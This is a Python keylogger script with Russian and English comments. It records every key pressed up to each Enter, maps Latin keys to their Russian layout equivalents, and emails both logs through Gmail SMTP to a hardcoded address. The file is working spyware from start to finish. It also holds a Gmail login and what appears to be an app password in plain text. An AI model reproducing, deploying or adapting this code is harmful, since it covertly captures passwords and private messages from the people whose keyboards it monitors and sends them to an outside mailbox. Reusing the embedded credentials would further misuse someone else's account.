import keyboard
import time
import smtplib
import threading
import os

engl_alph = []
login = 'ssbv70992@gmail.com' #логин отправителя/sender's login
password = 'ewxuqoempazfsvgt'  #password application/пароль приложения
reciever = 'ssbv70992@gmail.com'     #куда приходят символы с клавы/where do the characters come from the keyboard?
key_presses = []
key_presses_rus = [] #хранятся символы набранные на русском
#словари
rus_slovo = [
    "ф", "и", "с", "в", "у", "а", "п", "р", "ш", "о", 
    "л", "д", "ь", "т", "щ", "з", "й", "к", "ы", "е", 
    "г", "м", "ц", "ч", "н", "я",
    "Ф", "И", "С", "В", "У", "А", "П", "Р", "Ш", "О", 
    "Л", "Д", "Ь", "Т", "Щ", "З", "Й", "К", "Ы", "Е", 
    "Г", "М", "Ц", "Ч", "Н", "Я",
    "х", "ъ", "ж", "э", "б", "ю", ".", "ё",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "space", ",", "!", "?", ":", ";", "-", "_", "=", "+",
    "(", ")", "[", "]", "{", "}", "/", "\\", "|", "'",
    "\"", "<", ">", "@", "#", "$", "%", "^", "&", "*"
]
alphabet_eng = [
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", 
    "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", 
    "u", "v", "w", "x", "y", "z",
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", 
    "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", 
    "U", "V", "W", "X", "Y", "Z",
    "[", "]", ";", "'", ",", ".", "/", "`",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "space", ",", "!", "?", ":", ";", "-", "_", "=", "+",
    "(", ")", "[", "]", "{", "}", "/", "\\", "|", "'",
    "\"", "<", ">", "@", "#", "$", "%", "^", "&", "*"
]

     
def show(per):
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587) #smtp addr
    smtpObj.starttls()
    smtpObj.login(login, password)

    message = str(per)
    smtpObj.sendmail(login, reciever, message.encode ('utf-8'))
    smtpObj.quit()
    
def showtwo(perr):
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587) #smtp addr
    smtpObj.starttls()
    smtpObj.login(login, password)

    message = str(perr)
    smtpObj.sendmail(login, reciever, message.encode('utf-8'))
    smtpObj.quit()

def rusific():
     for bl in key_presses:
          found = False
          shett = -1
          for shet in alphabet_eng:
               shett+=1
               if shet == bl:
                    key_presses_rus.append(rus_slovo[shett])
                    found = True
                    break
          if not found:
               key_presses_rus.append(bl)

def Thread_upload():
    key_presses_copy = key_presses.copy()
    key_presses_rus_copy = key_presses_rus.copy()
    key_presses.clear()
    key_presses_rus.clear()
    show(key_presses_copy)#отправка
    showtwo(key_presses_rus_copy)
          
def poisk():
    while True:
        events = keyboard.record(until='enter')
        for event in events:
            if event.event_type == keyboard.KEY_DOWN:
                key_presses.append(event.name)
        rusific()
        threading.Thread(target=Thread_upload).start()

poisk()
